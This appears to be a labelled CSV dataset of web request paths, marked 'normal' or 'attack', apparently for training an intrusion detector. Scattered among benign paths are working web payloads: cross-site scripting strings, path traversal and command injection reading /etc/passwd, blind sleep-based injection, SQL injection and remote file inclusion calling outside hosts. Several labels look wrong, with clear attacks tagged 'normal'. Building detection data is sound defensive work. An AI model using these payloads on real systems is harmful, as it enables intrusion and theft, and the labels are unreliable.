payload,type
/esign-id/,normal
/325869/,normal
/en-resources/,normal
/q14622357,normal
/creates/,normal
/giving-thanks/,normal
/disced/,normal
/itbook/,normal
/040049/,normal
/0117154/,normal
/cameras1/,normal
/javascript/is.tar.gz,normal
/news-292/,normal
/poie022/,normal
/current_range/,normal
/p88207307/,normal
/044651/,normal
/scripts/wwwboard.html,attack
/juniper4_ac3/,normal
/javascript/adm.swf,normal
/f220303e/,normal
/harleygirl/,normal
/1440_anmelden/,normal
/d85863542111/,normal
/subwaybustram/,normal
/javascript/real.rtf,normal
/percocet_ingredient/,normal
/issue7_5/,normal
/061114-052046/,normal
/breitbartbutton/,normal
/1737218/,normal
/components/calendar/com_calendar.php?absolute_path=http://192.168.202.118:8080/2aibfaczmac8??,normal
/30874446/,normal
/doj_letter/,normal
/yourcreditscore/,normal
/section_display/,normal
/q62572563,normal
/news03512/,normal
/appendixa-d/,normal
/042470/,normal
/idbnew/,normal
/sommer-include/,normal
/gpl-faq/,normal
/can-nintendo1312/,normal
/musiikinsoitto_ohjelmat/,normal
/other-telecoms/,normal
/t1utils-1/,normal
/crypt4free/,normal
/dennis-mccauley/,normal
/financial-matters/,normal
/v14960425/,normal
/decision-23jan04/,normal
/javascript/statistics.vb,normal
/pr20001212b/,normal
/scripts/index.php?template=../../../loudblog/custom/config.php\x00,attack
/swissix_zurich/,normal
/182092949/,normal
/000114773/,normal
/119068/,normal
"/i2n4v4rl.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",attack
/msg27525380/,normal
/include.php?_app_relative_path=http://192.168.202.96:8080/txenjrxf3?,normal
/hackerdrw2/,normal
/prnnucptkixl.inc,normal
/ar2006083003009/,normal
|echo$IFSLXLUOD$((68%2B51))$(echo$IFSLXLUOD)LXLUOD,attack
/menu_jobs/,normal
/cgi-bin/webdist.cgi?distloc=;cat /etc/passwd,attack
/morganstein1/,normal
/interesting wow sites/,normal
/rightw/,normal
/0012238/,normal
/appendix1i-iv/,normal
/header_part3/,normal
/javascript/_common.nsf,normal
/javascript/daily.bz2,normal
/jesse_james/,normal
/killsun/,normal
/nav_mitos/,normal
/di2006120800784/,normal
/nessustest464004634.html,normal
/firefox_securit/,normal
/150291/,normal
/178763/,normal
/javascript/module/,normal
/cat-behandlungen/,normal
/index_146/,normal
/level314/,normal
/africa8/,normal
/rlocator/,normal
/xinfoshare/,normal
/your-privacy/,normal
/07promo_190/,normal
/070111/,normal
/text-replace/,normal
/mzk2mjc1/,normal
/sign.png,normal
/2004rightstart/,normal
/als2000/,normal
/200512bydate/,normal
/f2183130/,normal
/people_shatner/,normal
/javascript/gfx.tpl,normal
/427579/,normal
/blood in blood out/,normal
/javascript/layout.test,normal
/departamentos/,normal
/d2000-0872/,normal
/javascript/goaway.xsl,normal
/tk3849-xbtb06353/,normal
/scripts/cxvae_g3rjys.php3,attack
/pinrequest/,normal
/9046985941392727085/,normal
/chinait_80-60/,normal
/judgejudy/,normal
/wkiwar7/,normal
/bextralawsuit/,normal
/134498/,normal
/paciente/,normal
/javascript/input.jpg,normal
/interface/patient_file/reminder/clinical_reminders.php?patient_id=22592,normal
/275501/,normal
/180x100-chile/,normal
/167633/,normal
/javascript/test-cgi.cfm,normal
/custom_programming/,normal
' onmouseover=alert(/Black.Spook/),attack
/kimkomando/,normal
/144117/,normal
/bottomgreenpart3/,normal
/1492088/,normal
/javascript/events.db,normal
/download_engine_v1.4.3/admin/includes/spaw/dialogs/colorpicker.php?spaw_root=http://192.168.202.118:8080/iroy1gvqrrqu?,normal
/sample06/,normal
/oldsite/,normal
/985627805/,normal
/bluesleekframe_computer/,normal
/javascript/bandwidth.htm,normal
/179155/,normal
/gem56-0/,normal
/casehistory/,normal
/chameleonsprings1/,normal
/javascript/balances.tgz,normal
/minimal-app/,normal
/20050209-15/,normal
/notice_en/,normal
/phpmyadmin/googlesearch/googlesearch.php?app[path][lib]=/etc/passwd\x00,attack
/hm-dreamgirls/,normal
/javascript/eu.xml,normal
/127244/,normal
/dvdxcopy platinum 4/,normal
/346463/,normal
/140218/,normal
/prophotoproducts5/,normal
/kxdocker/,normal
/va - club energy vol/,normal
/q18172577,normal
/u701911/,normal
/days of our lives aug 9/,normal
/20050718schwartz/,normal
/cybill-download/,normal
/menu_end/,normal
/mailscan_commendations/,normal
/182118/,normal
/javascript/developers.fcgi,normal
/50903798/,normal
/javascript/meta.tmp,normal
/106176/,normal
/fryzury-krotkie/,normal
/perl/files.pl,normal
/javascript/db.tpl,normal
/lightlab/,normal
/vnews_on/,normal
/1035726/,normal
/117608/,normal
/2 girls with dildo's 1/,attack
/browse-3415021/,normal
/239898/,normal
/d8lvkq600/,normal
/download29/,normal
/rtl8180/,normal
/javascript/left.c,normal
/michalska/,normal
/851111/,normal
/body_bl/,normal
/sellamdproducts/,normal
/pict10/,normal
/qarbon meetingplace icreate v2/,normal
/online-education/,normal
/2170330/,normal
/lightedwindowdecorations/,normal
/30867946/,normal
/sxtoll/,normal
/pet_owners/,normal
/slashnot/,normal
/lasm_v2/,normal
/3650431/,normal
/038483/,normal
/transparante_i/,normal
/229824/,normal
/1046106/,normal
/examples/jsp/jsp2/jspx/admin/admin.php,normal
/javascript/site.txt,normal
/mozilla-calendar/,normal
/t_googledesktop/,normal
/109308/,normal
/xilosoft/,normal
/javascript/mp3s.tgz,normal
/pozycjonowanie_stron/,normal
/article-150076/,normal
/islandsinthenet/,normal
/thumb_rocket/,normal
/varbusiness5star032006/,normal
/opm-ch5/,normal
/javascript/item.o,normal
/i sanningens namn/,normal
/1109294087/,normal
/nowi_uzytkownicy2/,normal
/components/com_guestbook.php?absolute_path=XXpathXX?,attack
/libptp/,normal
/pic-gal/,normal
/javascript/mix.csv,normal
/netwatch-r0/,normal
/securityclassification/,normal
/190679/,normal
/t13984/,normal
/clarion/,normal
/novell-49/,normal
/173563/,normal
/homeschooling_info/,normal
/thinnet-cable/,normal
/scripts/msmmask.exe?mask=/junk334,attack
/cgi-bin/fileseek.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=,attack
/-12900/,normal
/gepi/gestion/savebackup.php?filename=http://192.168.202.118:8080/zz5thkvtmlgl?&cmd=cat/etc/passwd,attack
/588418/,normal
/ae92sr5/,normal
/javascript/bandwidth.old,normal
/scripts/acp/index.php,attack
/service_tel/,normal
/javascript/_vti_bin.err,normal
/11peterson/,normal
/serviceloginauth/,normal
/wanttobuy/,normal
/qhttpresponseheader/,normal
/w32rbotabj/,normal
/administrator/components/com_jcs/views/reports.html.php?mosconfig_absolute_path=http://192.168.202.96:8080/txenjrxf3?,normal
/16398471/,normal
/john_prine/,normal
/javascript/about.cfg,normal
/javascript/bsd.bz2,normal
/javascript/poi.doc,normal
/adelina/,normal
/deterrent/,normal
/048591/,normal
/perl14/,normal
/103429/,normal
%7C%20%5B%201%20-ne%20%24%28echo%20OIYJXA%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%26,attack
/bad-credit/,normal
/javascript/nethome.py,normal
/yahooemail2/,normal
/homeseh/,normal
/javascript/queries.db,normal
/advantafax/,normal
/fondo-sombra/,normal
/lockopen/,normal
/windswept-r0/,normal
/zevelizalde/,normal
/emhs jazz ensemble 2005/,normal
/venturi-eclectic_7jpg/,normal
/components/com_ajaxchat/tests/ajcuser.php?globals[mosconfig_absolute_path]=http://192.168.202.96:8080/txenjrxf3?,normal
/securitytoolprofiles/,normal
/javascript/mta.js,normal
/components/calendar/com_calendar.php?absolute_path=http://192.168.202.96:8080/swgnhpydbq0t??,normal
/a5dca5c7a51/,normal
/jimihendrix-hearmymusic/,normal
/pcpaper80x15/,normal
"/edv3mapy.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",attack
/alert_small/,normal
/newplayer/,normal
/javascript/fixed.phtml,normal
/stealthesecharts/,normal
"<div style=""background:url(test5.svg)"">PRESS ENTER</div>//[""'`-->]]>]</div>",attack
/r0y3exje.ashx,normal
/avira_webprotector/,normal
/guxqfbk7.asmx,normal
/10000002641/,normal
/evoteproject/,normal
/jobregister/,normal
/cap-top/,normal
/viagra-samples/,normal
/monophonic-ringtones/,normal
/000031858/,normal
%27%3B%20str%3D%24%28echo%20PSUJGU%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//,attack
/148759/,normal
/linkstop/,normal
/flickrclient.php?path_prefix=http://192.168.202.96:8080/4dckqcc0acprbz?,normal
/271-acdsee_v8/,normal
/topbusqueda/,normal
"<x data-bind="".:&#x5cu0061lert(1)"">",attack
/initour/,normal
/javascript/resources.xslt,normal
/163476/,normal
/sa011705/,normal
/bulfelis/,normal
/pmecelebrates/,normal
/148015/,normal
/directnic/,normal
/3647951/,normal
/a tale in the desert ii_information/,normal
/dbmagic/,normal
/02bnhm_gdperforma/,normal
/060817-060509/,normal
/neuefree/,normal
/rollcagev1/,normal
/119906/,normal
/dvdprofiler/,normal
/1004359368/,normal
/vp800remote/,normal
/javascript/admin.o,normal
/index_86/,normal
/w32rbotaxu/,normal
/roliga bilder/,normal
/162050/,normal
/admin/comment.php?config[installdir]=http://192.168.202.96:8080/no4ghqiguzhst?,normal
/trekkiedane/,normal
/saracens/,normal
/sensible-download/,normal
/22-coble/,normal
/americanorg/,normal
/msrblspamabout/,normal
/f190375e/,normal
/compbooks/,normal
/046048/,normal
/talking dictionary 2006 english to arabic v3/,normal
/javascript/low.pfx,normal
/3501_zr130/,normal
/captain_gifts/,normal
/javascript/thumbnail.tar.bz2,normal
/view_transaction/,normal
/squarebuttons/,normal
/javascript/type.ep,normal
/dansk_folkeparti/,normal
/bomberman/,normal
/sui-dynastie/,normal
/194433/,normal
/javascript/statements.php3,normal
/000098755/,normal
/essind/,normal
/154903/,normal
/infoxmlgetwmpassport/,normal
/220913751ycirmu/,normal
/503344/,normal
/jack the mp3 ripper 1/,normal
/ibm-244/,normal
/loc459/,normal
/examples/jsp/colors/colrs.jsp.1,normal
/download_75586/,normal
/javascript/mx.jsf,normal
/ico-images/,normal
/2098030/,normal
/javascript/tb.cs,normal
/en-us/account/docbuilder/top.php,normal
/dns4_icon/,normal
/931494_72881/,normal
/ea_spouse/,normal
/standard_icon/,normal
/wrar350br-final/,normal
/module-traceback/,normal
/examples/jsp/sessions/add_url.htm?node=<script>alert('xss')</script>,attack
/fid273f5597bb1cd47a2e21fb830b94fdd2644a6109/,normal
/stylesheet.php?version=1331749544,normal
/4e66682864f1eb02c97c0113aa336a9a/,normal
/brabus-rocket_18jpg/,normal
/scanvec/,normal
/187382_1/,normal
/platnosci/,normal
;echo%20ARXZSC$((51%2B16))$(echo%20ARXZSC)ARXZSC%2F%2F,attack
/cacheprosmall/,normal
/displaynews/,normal
/javascript/proc.rb,normal
/183764/,normal
/header_dailyrants/,normal
/t4ube6u9gr7c1ass2/,normal
/javascript/crypto.manifest,normal
/authentication/phpbb3/phpbb3.functions.php?pconfig_auth[phpbb_path]=http://192.168.202.118:8080/moclyxlwqyfjnp?,normal
/default_spanish/,normal
/6147862/,normal
/library/tooltip.js,normal
/medieval-2/,normal
/158926/,normal
/quickedc/,normal
/javascript/codec.db,normal
/williamcrhoden/,normal
/lightscape-download/,normal
/surfcontrol_offer/,normal
/oecd_forum/,normal
/003200/,normal
/recruiters1/,normal
<body scroll=confirm(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,attack
/javascript/select.bat,normal
/fptopbar/,normal
/listit/,normal
/javascript/cgi-sys.jpg,normal
/examples/servlets/servlet/status.php3,normal
/system/includes/pageheaderdefault.inc.php?_syssessionpath=http://192.168.202.118:8080/moclyxlwqyfjnp?,normal
/main_living/,normal
/javascript/httpd.csproj,normal
/javascript/have.exe,attack
/spaw/spaw_control.class.php?spaw_root=http://192.168.202.96:8080/4dckqcc0acprbz?,normal
/amethysts/,normal
/180985/,normal
/navlineltbluemedblue/,normal
/fuelguage/,normal
/defragnt/,normal
/k-hawk/,normal
/rofecox/,normal
/javascript/cgi-script.jsf,normal
/cristina-coria/,normal
/musikitty/,normal
/columnisthomenew/,normal
/2054642/,normal
/index1029/,normal
/javascript/procurement.do,normal
/javascript/yearly.log,normal
/040550/,normal
/dl7020/,normal
/webtechnologia/,normal
/116495/,normal
/javascript/1996.cc,normal
/sainyam/,normal
/comctl32/,normal
/purchase_bulk/,normal
/frontpage_chapmans/,normal
<x onmouseover=alert(1)>hover this! ,attack
/javascript/fortune.pfx,normal
/spiral tribe/,normal
/javascript/oem.fcgi,normal
/000123431/,normal
/msg47483/,normal
/privacymaker/,normal
/ramenfind/,normal
/admin/doeditconfig.php?thispath=../includes&config[path]=http://cirt.net/rfiinc.txt?,attack
/harotech/,normal
/mozart - mozart 200 sampler/,normal
/buyitnow/,normal
/javascript/j2ee.class,normal
/694800/,normal
/javascript/coldfusion.sh,normal
/directory.php?dir=;cat /etc/passwd,attack
/thread5103/,normal
/clanmts-hd_title/,normal
/115529/,normal
/javascript/appslocallogin.ora,normal
/javascript/forum1.pem,normal
/whyblock/,normal
/fwwebserver/,normal
/javascript/resolved.msg,normal
/javascript/services.rb,normal
/stats199904/,normal
/262004/,normal
/download-001005025/,normal
/javascript/phpbb2.jpg,normal
/32912_small/,normal
/20030417-6/,normal
/cdsnews/,normal
/127856/,normal
/javascript/makefile.tar.gz,normal
/manual/mod/mod_log_config.html,normal
/javascript/reporting.vb,normal
/joakizmo remixes/,normal
/q22793956,normal
/secure-convergence_fr/,normal
/df200005/,normal
/javascript/sessions.tpl,normal
/examples/jsp/jsp2/el/snoopservlet/,normal
/be4e362aebc77da98525715f00254de1/,normal
/5star_sm/,normal
/javascript/ganglia.aspx,normal
/javascript/communicator.properties,normal
/2022386/,normal
/yaconf/,normal
/page_28/,normal
/driver 3/,normal
/q86419922,normal
/64356135653039353435613033643030/,normal
/1168373079/,normal
/gsnt32/,normal
/nfbanner2/,normal
/img138/,normal
/uosciencesmedicales47dechuoft/,normal
/skinit in foam/,normal
/40794647/,normal
/people_oprah/,normal
/miscellaneous-pictures/,normal
/jaqherer - data file/,normal
/a4183095/,normal
/1203mcp_netiqgp/,normal
/164043/,normal
/p52-09/,normal
/01de02622ca8fb20dd6d28b9f9b182b1_0/,normal
/xbox_n/,normal
/javascript/information.rb,normal
/elegans/,normal
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FDEYNL%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C,attack
/aphrodis/,normal
/meeting_plan/,normal
/javascript/evt.tar.bz2,normal
/las-vegas_nv/,normal
/javascript/funding.sql,normal
/artykul-66/,normal
/037768/,normal
/javascript/novell,normal
/define-hemorrhage/,normal
/brandibelleyouandherpussy/,normal
/ethernet-cable/,normal
/rts-r0/,normal
/~pragh/,normal
/javascript/cfm.do,normal
/147755/,normal
/przegladaj/,normal
/195257/,normal
/daisywheel/,normal
/08-down/,normal
/ong bak  dvdscreenerripped by trandeira/,normal
/whats_new/,normal
/staraoke/,normal
/javascript/template.tar,normal
/loke martinzon - utan dig/,normal
/ws-services/,normal
/robots_thumb/,normal
/3574291/,normal
/165875/,normal
&#X03E;,attack
/symtables/,normal
/def jam - fight for ny/,normal
/moppe-lerum/,normal
/javascript/gfx.c,normal
/tagem!_v1/,normal
/memmonster/,normal
/humanite/,normal
/help.php?q=&del q99146784&rem ,normal
/003540/,normal
/addlinks/,normal
/javascript/custom-log.rhtml,normal
/cmdmore/,normal
/javascript/debug.lst,normal
/20030609-8/,normal
/grance/,normal
/javascript/cgibin.sh,normal
/329242/,normal
/bullet_triangle/,normal
/otherlanguages/,normal
/musicnews/,normal
/169124/,normal
/javascript/entries.ppt,normal
/custody-how/,normal
/v14647573/,normal
/awdftop03/,normal
/li2005040100133/,normal
/moton909/,normal
/menatwork1/,normal
/working-with-xml-files-in-java-using-dom/,normal
/313325540/,normal
/tk2872-mwsbar_dll/,normal
/bondkit/,normal
/153314/,normal
/ds62schema/,normal
/javascript/oaerrordetailpage.php3,normal
/embed/day.php?path=http://192.168.202.96:8080/llumt7msyau5y?,normal
/books12/,normal
/000093144/,normal
/javascript/logo.asmx,normal
/an_eyeopener/,normal
/snowflakes_sm/,normal
/javascript/lost+found.rtf,normal
/themaportals/,normal
/coverity/,normal
/gumbercules-font/,normal
/fanatical_support/,normal
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20QHSDUY%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,attack
/1-search/,normal
/automixmain_6/,normal
/cominfo/,normal
/javascript/overview.7z,normal
/t_zerotracks/,normal
/20010521-4/,normal
/th_peze31/,normal
/9790000/,normal
/x10_79/,normal
/javascript/img.key,normal
/scripts/xtextarea.scr.php?globals[pth][spaw]=http://192.168.202.118:8080/tzhfyzkbomspvm??,attack
/2867684/,normal
/tallygaroopna/,normal
/000047837/,normal
/295001/,normal
"/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1974863202,2,2009798962,4,5,6,7,8,9,0,1,2,3 --",normal
/211395/,normal
/ipgrundwissen/,normal
/javascript/foto.sh,normal
/109720/,normal
/english-north_american/,normal
/calendar.php?vwar_root=http://cirt.net/rfiinc.txt?,normal
/index1617/,normal
/sportscolumnists/,normal
/043348/,normal
/homeshu/,normal
/javascript/voip.yml,normal
/javascript/save.svn-base,normal
/securing_nt/,normal
/lighthouse_large/,normal
/e9rx3ya4.pl?<script>cross_site_scripting.nasl</script>,attack
/anglers_gifts/,normal
/3906465/,normal
/2168880/,normal
/javascript/umts.js,normal
/nytu006/,normal
/javascript/creator.rar,normal
/874852/,normal
+{toString:alert},attack
/sb116804006374468632-6a4rtfzegrmvtfnmm9tbmvk3mt0_20080106/,normal
/envocab/,normal
/javascript/hosting.dll,normal
/965ps3/,normal
/150282/,normal
/547037275obkxuf/,normal
/article770/,normal
/newstitle/,normal
/94index/,normal
/javascript/schedule.jhtml,normal
/damp_gifts/,normal
/javascript/torrents.key,normal
/pr20010712b/,normal
/pytable/,normal
/buprop/,normal
/thrust-ssc/,normal
/en-us/account/news/index.dot?id=../../../../../../../../../../../..//etc/passwd\x00.jpg,attack
"/h5i6crm3.php?<meta http-equiv=set-cookie content=""testlihk=7070"">",attack
/recent_upcoming/,normal
/253086/,normal
/3060000000059064/,normal
/yoot tower/,normal
/javascript/about.err,normal
/pingplotter_2/,normal
/225533201/,normal
/javascript/government.do,normal
/javascript/cgi-script.pl,normal
/philippines_tal/,normal
/20060802-2/,normal
/geneious/,normal
/javascript/faqs.orig,normal
"/3hlysl2x.do?<script>document.cookie=""testgjbe=8505;""</script>",attack
/eraser57/,normal
/atutor 1/,normal
/javascript/50.out,normal
/javascript/inbound.7z,normal
/smartcaps-i37635/,normal
/040476/,normal
/article_1574/,normal
/dekoracje/,normal
/lights at night/,normal
/dbehtzboyq/,normal
/oneadmin/config-bak.php?include_once=http://cirt.net/rfiinc.txt?,normal
/wae_06/,normal
/javascript/aliases.ep,normal
/javascript/bullet.log,normal
/winm32/,normal
/javascript/file.manifest,normal
/prologpluscg/,normal
/javascript/do.dump,normal
/unimut/,normal
/javascript/~ftp.mdb,normal
/1862868022/,normal
/testdrive/,normal
/campaignjournal/,normal
/javascript/func.xsl,normal
/phpmyadmin/index.bz2,normal
/190604/,normal
/sarah connor  christmas in my heart/,normal
/ibmdos2000_svensk ver/,normal
/msgreader$24927/,normal
/fact v1/,normal
/339630079/,normal
/manline/,normal
/862142/,normal
/javascript/ecommerce.test,normal
/en-us/modules/@95063/search/fieldpicker.css,normal
/121618/,normal
/audi-q7_40/,normal
/indextranny_03/,normal
/mzg1nju1/,normal
/netguides/,normal
/february1988motortrend/,normal
/javascript/avatars.bak,normal
/javascript/course,normal
/javascript/win.properties,normal
/cyber_meeting/,normal
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,attack
/msg87588/,normal
/javascript/alert.pfx,normal
/424031999/,normal
/biologia_credenze/,normal
/common.inc.php?cfg[libdir]=http://192.168.202.96:8080/no4ghqiguzhst?,normal
/post_806/,normal
/rhm-whatsnewonzdnet/,normal
/javascript/party.php3,normal
/javascript/sample.lst,normal
/latest_nr/,normal
/charlas/,normal
/surfanicskiwear/,normal
/javascript/linux.tar.gz,normal
/examples/servlets/servlet/story.pl?next=../../../../../etc/passwd\x00,attack
/swat4nointrofixall/,normal
/49285895/,normal
/john_mccain/,normal
/lb061211_90/,normal
/sourcecode_scripts/,attack
/javascript/root.csv,normal
/login.php?attempt=1&uname= 1332008511,normal
/audiovoxmicrosystemwithremovablecdplayerdms8770/,normal
/170092/,normal
/30880322/,normal
/javascript/servlets.html,normal
/africa37/,normal
/show off_information/,normal
/aitquiz/,normal
/049358/,normal
/775000/,normal
/000109432/,normal
/splatterprimp/,normal
/javascript/01.trace,normal
/javascript/lenya.dat,normal
/tc20060919_053475/,normal
/roxytw054/,normal
/avenuea/,normal
/154093/,normal
/kombi - 15 lat/,normal
/2002250788_consumerlegislation23m/,normal
/womanssweettoothschemeturnssour/,normal
/javascript/.bash_history.dat,normal
/javascript/intl.phtml,normal
/icons/index.jsp,normal
/pbfreebsd_sm/,normal
/1167658285_9008fm8/,normal
/mimg-6tst35/,normal
/robotsdoclist/,normal
/holidayevents37x37/,normal
/javascript/utils.pl,normal
/trlogo03/,normal
"'';!--""<XSS>=&{()}",attack
/about_bol/,normal
/116162040296353712/,normal
/javascript/audits.xls,normal
/u123119t/,normal
/64356135653039353435386639363730/,normal
/digital_creation/,normal
/thunderbird-80x15/,normal
"/main.php?logout=""del\xa0q91628118&rem\xa0",attack
/fordcassetteplayer/,normal
/my friends hot mom - mrs harms/,normal
/javascript/anon.xsl,normal
/msg08078/,normal
/childrensadventurestories/,normal
/a1 jummfa mp3 recorder 2/,normal
/javascript/agenda.jar,normal
/tapetyerotyczne11/,normal
/decisionnel/,normal
/pobierz-4855/,normal
/211106/,normal
/042390/,normal
/besuchertausch/,normal
/q12939641,normal
/bt_play/,normal
/dance santa dance screensaver v1/,normal
/javascript/start.bat,normal
/jagt oplevelser i skotland/,normal
/antarus/,normal
/msg28586/,normal
||echo%20CSDAYB$((1%2B92))$(echo%20CSDAYB)CSDAYB%27,attack
/javascript/wiki.csv,normal
/index06/,normal
/javascript/tour.bz2,normal
/but_resource01/,normal
/namibia/,normal
/ec-26_s/,normal
/poker-8/,normal
/boekeninfo/,normal
/275945/,normal
/1146813/,normal
%22%7C%20%5B%202%20-ne%20%24%28echo%20GBBAUV%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,attack
/hoffman/,normal
/06stew/,normal
/ird2002/,normal
/hepatitis/,normal
/getpage.php?page=online&doc_path=http://192.168.202.118:8080/zz5thkvtmlgl?,normal
/822589/,normal
/startsidan/,normal
/javascript/sec.fcgi,normal
/1426209/,normal
/reservation/,normal
/laura_headshot/,normal
%0A%20str%3D%24%28echo%20UVFUKR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20,attack
/biblioteca/luo_form.php?classpath=@rfiurl,normal
/038979/,normal
/statesmanstandingphotos/,normal
/ch02_01/,normal
/ports3400to3499/,normal
/gauner/,normal
/fullstory/,normal
/pm9t6l87khfst/,normal
/3m-brands/,normal
/israelieviluri/,normal
/javascript/serv.php3,normal
/ps6730/,normal
/includes/init.php?includepath=http://192.168.202.118:8080/zz5thkvtmlgl??,normal
/phish060221b/,normal
/javascript/filelist.pl,normal
/help/?.jsp,normal
/javascript/footers.htm,normal
/webseman05_1/,normal
/index5127/,normal
/javascript/buttons.mdb,normal
/tn1049/,normal
/softeng/,normal
/msgreader$14530/,normal
/macdraft_3/,normal
/javascript/backend.sfish,normal
/courtney_love/,normal
/javascript/tmps.do,normal
/javascript/month.dat,normal
/javascript/dtd.7z,normal
/newarrivalsspainandportugal/,normal
"<div id=""68""><doc xmlns:xlink=""http://www.w3.org/1999/xlink"" xmlns:html=""http://www.w3.org/1999/xhtml"">",attack
/standalone12_04/,normal
/1004331159/,normal
/unix_simulator/,normal
/schal-de/,normal
/96287949_m/,normal
/delmole85/,normal
/141269/,normal
/000024099/,normal
/javascript/readme.log,normal
/searchfor/,normal
/turing_days/,normal
/177423/,normal
/159579/,normal
/marinepopup_11/,normal
/the butterfly effect 2/,normal
/scofaq/,normal
/12808886_50/,normal
/javascript/receive.html,normal
/048375/,normal
/javascript/base.txt,normal
/145633/,normal
/20051101-5/,normal
/marble-flooring/,normal
/javascript/25.fcgi,normal
/electronicdaytimerorganizer/,normal
/124478/,normal
/linky-170/,normal
/dscn0094/,normal
/fiji-hotels/,normal
/ws1000/,normal
/javascript/obsoleted.zip,normal
/javascript/int.tgz,normal
/14350070d0/,normal
/10602550/,normal
/6177591/,normal
/mjkwnjyz/,normal
/mtoken/,normal
/ipaq-h555/,normal
/javascript/youtube.cgi,normal
/gamespot/,normal
/258544/,normal
/39169_thumb/,normal
/capture_00012/,normal
/javascript/travel.pl,normal
/phpmyadmin/db_structure.php?server=1&token=bc717cd2c58b7b1efb1720ff78d91f90&db=openemr&table=&lang=en-utf-8&collation_connection=utf8_general_ci,normal
/24700247/,normal
/controlpaneldemo/,normal
/mambo_styles/,normal
/javascript/01.asp,normal
/javascript/osc.core,normal
/300012/,normal
/main_med/,normal
/community_news/,normal
/simply-threaded/,normal
/topphotos_aliciakeys/,normal
/takemehome/,normal
/tvi200c/,normal
/javascript/android.out,normal
/javascript/sources.pfx,normal
/finalmark/,normal
/p49-07/,normal
/cns!8560b877fe8e9138!1236/,normal
/javascript/2001.rtf,normal
/_friendly/core/support/_load.php?friendly_path=http://192.168.202.96:8080/vir0v3xfc?,normal
/navi_webmonkey/,normal
/docs/jasper-howto.html,normal
/help.php?q='&del\x09q78257168\x09#,attack
/x-desk95 v1/,normal
/javascript/styles.pem,normal
/foenetik/,normal
/061017_3/,normal
/business_feat/,normal
/showmorestory/,normal
/decadedisappoint/,normal
"/0,4161,2760348-9,00/",normal
/113785/,normal
/apeironx_banner/,normal
/fabjects/,normal
/george_peabody/,normal
/index_name/,normal
/radiosawaiq/,normal
/0000030582-article/,normal
/newsprint-2049/,normal
/20040814-2/,normal
/706851/,normal
/0039499691886076691233284820402124827669/,normal
/javascript/exec.swf,normal
/pdrm7404_small/,normal
/marcd_testimonial/,normal
/t10808/,normal
/theme_pack/,normal
/the-island/,normal
/javascript/tmps.class,normal
/209972/,normal
/mashup/,normal
/q47791696,normal
/872798/,normal
/drughous/,normal
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20TMPVMS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,attack
/zag_rocks/,normal
/portraet/,normal
/wondershare ppt2dvd_information/,normal
/nssol_s/,normal
/1300742/,normal
/tasklist_d/,normal
/secondlife01/,normal
/15814492/,normal
/servlet/org.apache.catalina.context/<script>alert('vulnerable')</script>,attack
/javascript/real.trace,normal
/flat beat compilation - mr/,normal
/2943480620030483255rlfxdc_th/,normal
/javascript/paid.tar.bz2,normal
/spsforum/,normal
/msg12360/,normal
/javascript/errors/,normal
/dsc_6710/,normal
/morrissey - sunny/,normal
/marineci_mcwp2-14/,normal
/spying/,normal
/380230/,normal
/political-representation/,normal
/uefa champions league 2004 - 2005_information/,normal
/javascript/samba.cfm,normal
/25576164/,normal
/jdhouse4/,normal
/ad20060110/,normal
/carnivore3/,normal
/melisa/,normal
/122588/,normal
/1909140971/,normal
/idstat/,normal
/holystic/,normal
/javascript/logging.test,normal
/6580628/,normal
/iw_sign/,normal
/javascript/icons.old,normal
/dl78265/,normal
/admin/images/notify_critical.png,normal
/fidc7512efb570616853564b98937efa5f1fc284fa0/,normal
/athena.php?athena_dir=http://192.168.202.118:8080/moclyxlwqyfjnp?,normal
/phones4life/,normal
/compactflash/,normal
/page_039327/,normal
/greenbutton_right/,normal
/5187-3560/,normal
/129867/,normal
/backissues/,normal
/prisonandjails/,normal
/javascript/javascript.nsf,normal
/skidor - absence/,normal
/20030130-10/,normal
/zoomin/,normal
/a24921-2005feb14/,normal
/msg326478/,normal
/pescatore/,normal
/javascript/porn.py,normal
/configsortorder/,normal
/browse_anime/,normal
/georgetown/,normal
/perlmodlib/,normal
/4clejpt/,normal
/fushion_cash/,normal
/order_ethics/,normal
/126006/,normal
/117174/,normal
/011c317/,normal